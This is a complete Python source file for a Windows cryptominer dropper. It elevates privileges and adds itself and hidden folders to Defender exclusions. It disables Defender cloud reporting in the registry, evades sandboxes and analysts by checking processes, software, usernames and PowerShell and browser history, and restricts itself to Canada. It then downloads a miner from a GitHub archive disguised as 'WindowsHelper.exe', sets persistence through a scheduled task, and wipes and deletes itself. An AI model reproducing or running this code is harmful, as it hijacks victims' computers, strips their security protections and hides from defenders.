import ctypes, os, sys, subprocess, json, sqlite3, configparser, random, datetime, urllib.request, winreg, logging, traceback, time, zipfile, shutil, tempfile

DEBUG_MODE = True
ENABLE_PERSISTENCE = True
TESTING_MODE = True
hawk = logging.getLogger('hawk')
hawk.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
ch.setFormatter(formatter)
hawk.addHandler(ch)

def global_exception_handler(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    hawk.critical("Unhandled exception:", exc_info=(exc_type, exc_value, exc_traceback))
    for h in hawk.handlers:
        h.flush()
    input("\nPress Enter to exit...")
    sys.exit(999)

sys.excepthook = global_exception_handler

ERR = {
    'RAM_LOW': 101, 'SUSPICIOUS_USERNAME': 102, 'AV_PROCESS_FOUND': 201, 'TOOL_PROCESS_FOUND': 202,
    'AV_SOFTWARE_FOUND': 301, 'TOOL_SOFTWARE_FOUND': 302, 'GEO_FAIL': 401, 'PS_HISTORY_LARGE': 501,
    'PS_RISKY_COMMANDS': 502, 'LOW_BROWSER_APP_CLUSTER': 601, 'ELEVATION_LOOP': 801, 'UNEXPECTED': 999
}

def log_environment_info():
    try:
        admin = is_admin()
        hawk.info(f"[ENV] Admin: {admin}")
        try:
            gid = ctypes.windll.kernel32.GetUserGeoID(16)
            country = "Canada" if gid == 39 else f"GeoID {gid}"
            hawk.info(f"[ENV] Country (GeoID): {country}")
        except:
            hawk.info("[ENV] Country: unknown")
    except:
        pass

def trigger_exit(code, reason):
    log_environment_info()
    hawk.critical(f"TRIGGER_EXIT|code={code}|reason={reason}")
    for h in hawk.handlers:
        h.flush()
    if not DEBUG_MODE:
        self_del()
    else:
        hawk.info("DEBUG: self-deletion suppressed.")
        input("\n>>> Debug mode: Press Enter to exit...")
        sys.exit(0)

def self_del():
    p = os.path.abspath(sys.argv[0])
    if not os.path.exists(p): sys.exit(0)
    try:
        sz = os.path.getsize(p)
        with open(p, 'wb') as f:
            f.write(os.urandom(sz))
            f.flush()
            os.fsync(f.fileno())
        os.remove(p)
    except:
        bat = f'{p}.del.bat'
        with open(bat, 'w') as f:
            f.write(f'@echo off\nping 127.0.0.1 -n 2 > nul\ndel /f /q "{p}"\ndel /f /q "{bat}"\n')
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def elevate():
    if is_admin(): return
    if os.environ.get('__ELEVATED_ATTEMPT__') == '1':
        hawk.critical("Elevation loop detected")
        trigger_exit(ERR['ELEVATION_LOOP'], "UAC disabled or elevation failed twice")
    os.environ['__ELEVATED_ATTEMPT__'] = '1'
    script = os.path.abspath(sys.argv[0])
    params = ' '.join(f'"{a}"' for a in sys.argv[1:])
    ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    if ret <= 32:
        hawk.critical(f"Elevation failed with error code {ret}")
        if DEBUG_MODE:
            input("UAC elevation failed. Please run this script as administrator. Press Enter to exit.")
        trigger_exit(ERR['ELEVATION_LOOP'], f"ShellExecute error {ret}")
    if DEBUG_MODE:
        input("Elevation requested. The script is now restarting as admin. Press Enter to close this window.")
    sys.exit(0)

def add_self_to_defender_exclusions():
    hawk.info("[EXCLUSION] adding script to Defender exclusions")
    try:
        script_path = os.path.abspath(sys.argv[0])
        cmd = f'Add-MpPreference -ExclusionPath "{script_path}"'
        subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[EXCLUSION] done")
    except Exception as e:
        hawk.error(f"[EXCLUSION] failed: {e}", exc_info=True)

def add_folder_to_defender_exclusions(path):
    hawk.info(f"[EXCLUSION] adding folder {path} to Defender exclusions")
    try:
        cmd = f'Add-MpPreference -ExclusionPath "{path}"'
        subprocess.run(['powershell', '-Command', cmd], capture_output=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info(f"[EXCLUSION] folder {path} added")
    except Exception as e:
        hawk.error(f"[EXCLUSION] folder exclusion failed: {e}", exc_info=True)

def chk_ram():
    hawk.info("[RAM_CHECK] start")
    try:
        class MEM(ctypes.Structure):
            _fields_ = [("len", ctypes.c_ulong), ("load", ctypes.c_ulong), ("total", ctypes.c_ulonglong),
                        ("avail", ctypes.c_ulonglong), ("pf", ctypes.c_ulonglong), ("pfa", ctypes.c_ulonglong),
                        ("virt", ctypes.c_ulonglong), ("va", ctypes.c_ulonglong), ("ext", ctypes.c_ulonglong)]
        m = MEM()
        m.len = ctypes.sizeof(MEM)
        if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m)):
            hawk.error("[RAM_CHECK] GlobalMemoryStatusEx failed")
            return
        gb = m.total / (1024**3)
        hawk.debug(f"[RAM_CHECK] total={gb:.2f} GB")
        if gb < 2.0:
            hawk.critical(f"[RAM_CHECK] FAIL {gb:.2f} < 2")
            if not TESTING_MODE:
                trigger_exit(ERR['RAM_LOW'], f"RAM {gb:.2f} GB")
            else:
                hawk.warning(f"TESTING: Would have exited – RAM {gb:.2f} GB")
        hawk.info("[RAM_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[RAM_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "RAM check crashed")

SANDBOX_EXACT = {'sandbox', 'malware', 'virus', 'cuckoo', 'nms', 'vmware', 'virtual', 'admin-test'}
def chk_user():
    hawk.info("[USER_CHECK] start")
    try:
        try: u = os.getlogin().lower()
        except: u = os.environ.get('USERNAME', '').lower()
        hawk.debug(f"[USER_CHECK] username={u}")
        if u in SANDBOX_EXACT:
            if not TESTING_MODE:
                trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Exact sandbox name: {u}")
            else:
                hawk.warning(f"TESTING: Would have exited – username {u} is sandbox")
        score = 0
        if len(u) < 4: score += 30
        if any(word in u for word in ['sandbox', 'malware', 'cuckoo', 'vmware', 'virtual']):
            score += 20
        if score >= 40:
            if not TESTING_MODE:
                trigger_exit(ERR['SUSPICIOUS_USERNAME'], f"Username suspicion score {score}")
            else:
                hawk.warning(f"TESTING: Would have exited – username score {score}")
        hawk.info("[USER_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[USER_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "User check crashed")

AV_PROCS = {
    'bdagent.exe', 'avastui.exe', 'avgui.exe', 'mbam.exe', 'mbamservice.exe',
    'kav.exe', 'egui.exe', 'fsbts.exe', 'sophos.exe', 'mcshield.exe', 'navw32.exe'
}
TOOL_PROCS = {
    'wireshark.exe', 'procmon.exe', 'procexp.exe', 'ghidra.exe', 'ida.exe', 'x64dbg.exe', 'ollydbg.exe',
    'windbg.exe', 'fiddler.exe', 'charles.exe', 'tcpview.exe', 'regshot.exe', 'autoruns.exe', 'processhacker.exe'
}

def chk_procs():
    hawk.info("[PROC_CHECK] start")
    try:
        out = subprocess.run('tasklist /fo csv /nh', capture_output=True, text=True, shell=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW).stdout.lower()
        for line in out.splitlines():
            for p in AV_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] AV process: {p}")
                    if not TESTING_MODE:
                        trigger_exit(ERR['AV_PROCESS_FOUND'], f"Process: {p}")
                    else:
                        hawk.warning(f"TESTING: Would have exited – AV process {p}")
            for p in TOOL_PROCS:
                if p in line:
                    hawk.critical(f"[PROC_CHECK] Tool process: {p}")
                    if not TESTING_MODE:
                        trigger_exit(ERR['TOOL_PROCESS_FOUND'], f"Process: {p}")
                    else:
                        hawk.warning(f"TESTING: Would have exited – tool process {p}")
    except Exception as e:
        hawk.error(f"[PROC_CHECK] error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Process check failed completely")
    hawk.info("[PROC_CHECK] pass")

AV_BRANDS = {
    'bitdefender':'antivirus', 'malwarebytes':'antimalware', 'norton':'security', 'mcafee':'antivirus',
    'kaspersky':'security', 'avast':'antivirus', 'avg':'antivirus', 'eset':'security', 'trend micro':'security',
    'sophos':'antivirus', 'comodo':'security', 'f-secure':'security', 'g data':'antivirus', 'panda':'antivirus', 'webroot':'antivirus'
}
TOOL_NAMES = {
    'wireshark','procmon','process explorer','ghidra','ida pro','x64dbg','ollydbg','windbg',
    'fiddler','charles','http debugger','api monitor','tcpview','regshot','autoruns','process hacker',
    'dnspy','ilspy','pebear','resource hacker'
}

def chk_software():
    hawk.info("[SW_CHECK] start")
    total_keys = 0
    try:
        hives = [(winreg.HKEY_LOCAL_MACHINE, [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]),
                 (winreg.HKEY_CURRENT_USER, [r"Software\Microsoft\Windows\CurrentVersion\Uninstall"])]
        for hkey, bases in hives:
            for base in bases:
                try:
                    k = winreg.OpenKey(hkey, base)
                    i = 0
                    while True:
                        try:
                            name = winreg.EnumKey(k, i)
                            total_keys += 1
                            try:
                                with winreg.OpenKey(hkey, f"{base}\\{name}") as sk:
                                    d, _ = winreg.QueryValueEx(sk, "DisplayName")
                                    d = d.lower()
                                    for brand in AV_BRANDS:
                                        if brand in d:
                                            if 'windows' not in d and 'defender' not in d and 'vpn' not in d:
                                                hawk.critical(f"[SW_CHECK] AV: {d}")
                                                if not TESTING_MODE:
                                                    trigger_exit(ERR['AV_SOFTWARE_FOUND'], f"AV: {d}")
                                                else:
                                                    hawk.warning(f"TESTING: Would have exited – AV: {d}")
                                    for t in TOOL_NAMES:
                                        if t in d:
                                            hawk.critical(f"[SW_CHECK] Tool: {d}")
                                            if not TESTING_MODE:
                                                trigger_exit(ERR['TOOL_SOFTWARE_FOUND'], f"Tool: {d}")
                                            else:
                                                hawk.warning(f"TESTING: Would have exited – Tool: {d}")
                            except OSError:
                                pass
                            except Exception as e:
                                hawk.warning(f"[SW_CHECK] error reading key {name}: {e}", exc_info=True)
                            i += 1
                        except WindowsError: break
                    winreg.CloseKey(k)
                except Exception as e:
                    hawk.error(f"[SW_CHECK] reg error: {e}", exc_info=True)
        hawk.debug(f"[SW_CHECK] total keys enumerated: {total_keys}")
        if total_keys < 10 and not is_admin():
            hawk.warning("[SW_CHECK] few keys and not admin – uninstall data may be incomplete")
        hawk.info("[SW_CHECK] pass")
    except Exception as e:
        hawk.critical(f"[SW_CHECK] unexpected fatal error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Software check crashed")

def _fetch(url):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    return urllib.request.urlopen(req, timeout=5)

def geo_ca():
    hawk.info("[GEO_CHECK] start")
    try:
        try:
            gid = ctypes.windll.kernel32.GetUserGeoID(16)
            hawk.debug(f"[GEO_CHECK] GeoID={gid}")
            if gid == 39:
                hawk.info("[GEO_CHECK] pass via GeoID")
                return True
        except Exception as e:
            hawk.error(f"[GEO_CHECK] GeoID error: {e}", exc_info=True)

        apis = [
            ('http://ip-api.com/json/?fields=countryCode,proxy,isp,org,as', lambda d: (d.get('countryCode',''), d.get('proxy',False), ' '.join([d.get('isp',''), d.get('org',''), d.get('as','')]).lower())),
            ('http://ipapi.co/json/', lambda d: (d.get('country',''), d.get('proxy',False), ' '.join([d.get('org','')]).lower()))
        ]
        vpn_words = ['hosting','cloud','datacenter','vpn','proxy','tor','digitalocean','vultr','linode','ovh','hetzner','leaseweb']
        results = []
        for url, parser in apis:
            try:
                data = json.loads(_fetch(url).read().decode())
                cc, proxy, isp_org = parser(data)
                hawk.debug(f"[GEO_CHECK] API {url}: cc={cc}, proxy={proxy}, isp_org={isp_org}")
                vpn_hit = any(w in isp_org for w in vpn_words)
                results.append((cc, proxy, vpn_hit))
            except Exception as e:
                hawk.error(f"[GEO_CHECK] API {url} error: {e}", exc_info=True)

        if results:
            ca_ips = all(r[0]=='CA' for r in results)
            any_proxy = any(r[1] for r in results)
            any_vpn = any(r[2] for r in results)
            hawk.debug(f"[GEO_CHECK] consensus: ca={ca_ips}, proxy={any_proxy}, vpn={any_vpn}")
            if ca_ips and not any_proxy and not any_vpn:
                hawk.info("[GEO_CHECK] pass via IP consensus")
                return True
            elif ca_ips and (any_proxy or any_vpn):
                hawk.critical("[GEO_CHECK] VPN/proxy with CA IP – failing closed")
            else:
                hawk.critical("[GEO_CHECK] not all IPs Canada")
        else:
            hawk.critical("[GEO_CHECK] all IP APIs failed")
        if not TESTING_MODE:
            trigger_exit(ERR['GEO_FAIL'], "Not Canada or VPN/proxy detected")
        else:
            hawk.warning("TESTING: Would have exited – geo check failed")
        return False
    except Exception as e:
        hawk.critical(f"[GEO_CHECK] unexpected error: {e}", exc_info=True)
        if not TESTING_MODE:
            trigger_exit(ERR['UNEXPECTED'], "Geo check crashed")
        return False

def get_sys_install_age_days():
    try:
        out = subprocess.run('systeminfo', capture_output=True, text=True, shell=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW).stdout
        for line in out.splitlines():
            if 'Original Install Date' in line:
                date_str = line.split(':', 1)[1].strip()
                for fmt in ("%m/%d/%Y, %I:%M:%S %p", "%Y-%m-%d"):
                    try:
                        dt = datetime.datetime.strptime(date_str, fmt)
                        return (datetime.datetime.now() - dt).days
                    except ValueError:
                        continue
    except Exception as e:
        hawk.error(f"[SYS_INSTALL_AGE] failed: {e}", exc_info=True)
    return 365

def chk_ps_history():
    hawk.info("[PS_CHECK] start")
    try:
        hp = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        if not os.path.exists(hp):
            hawk.info("[PS_CHECK] no history file")
            return
        with open(hp, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
        cnt = len(lines)
        hawk.debug(f"[PS_CHECK] line count={cnt}")
        sys_age = get_sys_install_age_days()
        threshold = 2000 if sys_age > 30 else 800
        if cnt > threshold:
            hawk.critical(f"[PS_CHECK] count {cnt} > {threshold}")
            if not TESTING_MODE:
                trigger_exit(ERR['PS_HISTORY_LARGE'], f"Lines: {cnt}")
            else:
                hawk.warning(f"TESTING: Would have exited – PS history large ({cnt})")
        if cnt > 30:
            combined = ' '.join(lines).lower()
            risky_high = ['invoke-expression', 'iex ', 'downloadstring', 'frombase64', '-enc ']
            risky_low = ['start-process']
            hits_high = sum(1 for r in risky_high if r in combined)
            hits_low = sum(1 for r in risky_low if r in combined)
            hawk.debug(f"[PS_CHECK] risky high={hits_high}, low={hits_low}")
            if hits_high >= 3 or hits_low >= 15:
                hawk.critical(f"[PS_CHECK] risky commands high={hits_high}, low={hits_low}")
                if not TESTING_MODE:
                    trigger_exit(ERR['PS_RISKY_COMMANDS'], f"High:{hits_high} Low:{hits_low}")
                else:
                    hawk.warning(f"TESTING: Would have exited – risky PS commands")
    except Exception as e:
        hawk.error(f"[PS_CHECK] error: {e}", exc_info=True)
    hawk.info("[PS_CHECK] pass")

def browser_history():
    hawk.info("[HISTORY_CHECK] start")
    cnt = 0
    try:
        def count_db(db_path, table, col):
            tmp = None
            try:
                fd, tmp = tempfile.mkstemp(suffix='.sqlite')
                os.close(fd)
                shutil.copy2(db_path, tmp)
                uri = 'file:' + tmp.replace('\\', '/') + '?mode=ro'
                conn = sqlite3.connect(uri, uri=True, timeout=2)
                cur = conn.execute(f"SELECT COUNT(*) FROM {table}")
                res = cur.fetchone()[0]
                conn.close()
                return res
            except:
                return 0
            finally:
                if tmp and os.path.exists(tmp):
                    os.unlink(tmp)

        chrome_root = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
        if os.path.isdir(chrome_root):
            for profile in os.listdir(chrome_root):
                db = os.path.join(chrome_root, profile, 'History')
                if os.path.exists(db):
                    cnt += count_db(db, 'urls', None)

        edge_db = os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default\History')
        if os.path.exists(edge_db):
            cnt += count_db(edge_db, 'urls', None)

        ff_ini = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\profiles.ini')
        if os.path.exists(ff_ini):
            try:
                cfg = configparser.ConfigParser()
                cfg.read(ff_ini)
                for sec in cfg.sections():
                    if 'default' in sec.lower() or cfg.get(sec,'Name',fallback=None)=='Default':
                        pp = cfg.get(sec,'path',fallback=None)
                        if pp:
                            if not os.path.isabs(pp): pp = os.path.join(os.environ['APPDATA'],'Mozilla','Firefox',pp)
                            places = os.path.join(pp,'places.sqlite')
                            if os.path.exists(places):
                                cnt += count_db(places, 'moz_places', None)
            except:
                pass
    except Exception as e:
        hawk.error(f"[HISTORY_CHECK] fatal error: {e}", exc_info=True)
    hawk.debug(f"[HISTORY_CHECK] total={cnt}")
    hawk.info("[HISTORY_CHECK] end")
    return cnt

def app_cluster():
    hawk.info("[APP_CLUSTER_CHECK] start")
    hawk.debug("[APP_CLUSTER_CHECK] disabled")
    hawk.info("[APP_CLUSTER_CHECK] end")
    return False

def disable_defender_cloud():
    hawk.info("[DEFENDER_DISABLE] start")
    try:
        spynet_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, spynet_path)
        winreg.SetValueEx(key, "SpynetReporting", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "SubmitSamplesConsent", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(key, "DisableBlockAtFirstSeen", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        hawk.info("[DEFENDER_DISABLE] done")
    except Exception as e:
        hawk.error(f"[DEFENDER_DISABLE] failed: {e}", exc_info=True)

def download_and_prepare():
    hawk.info("[DOWNLOAD] start")
    repo_url = "https://github.com/ivanban789/bom/archive/refs/heads/main.zip"
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "repo.zip")
    try:
        hawk.debug(f"[DOWNLOAD] fetching {repo_url}")
        urllib.request.urlretrieve(repo_url, zip_path)
        hawk.debug("[DOWNLOAD] extracting")
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(temp_dir)
        extracted_items = [d for d in os.listdir(temp_dir) if d != "repo.zip" and os.path.isdir(os.path.join(temp_dir, d))]
        if not extracted_items:
            raise Exception("No extracted folder found")
        extracted_root = os.path.join(temp_dir, extracted_items[0])
        prog_files = os.environ.get("ProgramFiles", "C:\\Program Files")
        install_exe_dir = os.path.join(prog_files, "Windows Security", "Endpoint")
        os.makedirs(install_exe_dir, exist_ok=True)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(install_exe_dir, FILE_ATTRIBUTE_HIDDEN)
        add_folder_to_defender_exclusions(install_exe_dir)
        config_dir = os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Themes", "CachedFiles")
        os.makedirs(config_dir, exist_ok=True)
        ctypes.windll.kernel32.SetFileAttributesW(config_dir, FILE_ATTRIBUTE_HIDDEN)
        add_folder_to_defender_exclusions(config_dir)
        src_exe = None
        src_config = None
        for root, dirs, files in os.walk(extracted_root):
            for f in files:
                if f.lower() == "windowshelper.exe":
                    src_exe = os.path.join(root, f)
                elif f.lower() == "config.json":
                    src_config = os.path.join(root, f)
        if src_exe:
            dest_exe = os.path.join(install_exe_dir, "WindowsHelper.exe")
            shutil.copy2(src_exe, dest_exe)
            hawk.debug(f"[DOWNLOAD] exe placed at {dest_exe}")
        else:
            hawk.error("[DOWNLOAD] WindowsHelper.exe not found in repo")
            return None, None
        if src_config:
            dest_config = os.path.join(config_dir, "config.json")
            shutil.copy2(src_config, dest_config)
            hawk.debug(f"[DOWNLOAD] config.json placed at {dest_config}")
        else:
            hawk.warning("[DOWNLOAD] config.json not found, will generate")
        return dest_exe, config_dir
    except Exception as e:
        hawk.error(f"[DOWNLOAD] failed: {e}", exc_info=True)
        return None, None
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def generate_config(config_dir):
    hawk.info("[CONFIG] generating config.json")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "max-threads-hint": 50,
            "max-cpu-usage": 50
        },
        "pools": [
            {
                "url": "p2pool.io:3333",
                "user": "",
                "pass": "x",
                "keepalive": True,
                "tls": False
            }
        ]
    }
    config_path = os.path.join(config_dir, "config.json")
    try:
        with open(config_path, 'w') as cf:
            json.dump(config, cf, indent=2)
        hawk.info(f"[CONFIG] written to {config_path}")
    except Exception as e:
        hawk.error(f"[CONFIG] write failed: {e}", exc_info=True)

def start_miner(exe_path, config_dir):
    hawk.info(f"[MINER] launching {exe_path}")
    try:
        proc = subprocess.Popen(
            [exe_path, f"--config={os.path.join(config_dir, 'config.json')}"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        hawk.info(f"[MINER] PID {proc.pid}")
        return proc
    except Exception as e:
        hawk.error(f"[MINER] failed to start: {e}", exc_info=True)
        return None

def create_scheduled_task(exe_path, config_dir):
    if not ENABLE_PERSISTENCE:
        hawk.info("[PERSISTENCE] disabled")
        return
    hawk.info("[PERSISTENCE] creating scheduled task for miner")
    try:
        task_name = "WindowsHelperTask"
        config_path = os.path.join(config_dir, 'config.json')
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path} --config={config_path}" /sc onlogon /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] scheduled task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] failed: {e}", exc_info=True)

def run_payload():
    disable_defender_cloud()
    exe, config_dir = download_and_prepare()
    if not exe or not config_dir:
        hawk.critical("[PAYLOAD] preparation failed, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Payload preparation failed")
    if not os.path.exists(os.path.join(config_dir, "config.json")):
        generate_config(config_dir)
    miner = start_miner(exe, config_dir)
    if not miner:
        trigger_exit(ERR['UNEXPECTED'], "Miner launch failed")
    create_scheduled_task(exe, config_dir)
    hawk.info("[PAYLOAD] miner running, self-deleting dropper")
    self_del()

def main():
    hawk.info(f"[MAIN] start, PID={os.getpid()}, args={sys.argv}")
    if not is_admin():
        hawk.info("[MAIN] elevating")
        elevate()
    if not is_admin():
        hawk.critical("[MAIN] still not admin after elevation attempt")
        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")
    add_self_to_defender_exclusions()
    chk_ram()
    chk_user()
    chk_procs()
    chk_software()
    geo_ca()
    chk_ps_history()
    hist = browser_history()
    if hist < 20 and app_cluster():
        hawk.critical(f"[MAIN] low history {hist} + app cluster")
        if not TESTING_MODE:
            trigger_exit(ERR['LOW_BROWSER_APP_CLUSTER'], f"History={hist}, cluster")
        else:
            hawk.warning("TESTING: Would have exited – low browser history + app cluster")
    hawk.info("[MAIN] all checks passed – environment legitimate")
    run_payload()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        hawk.critical("!!! UNHANDLED ERROR OUTSIDE MAIN !!!", exc_info=True)
        for h in hawk.handlers:
            h.flush()
        input("\nPress Enter to exit...")
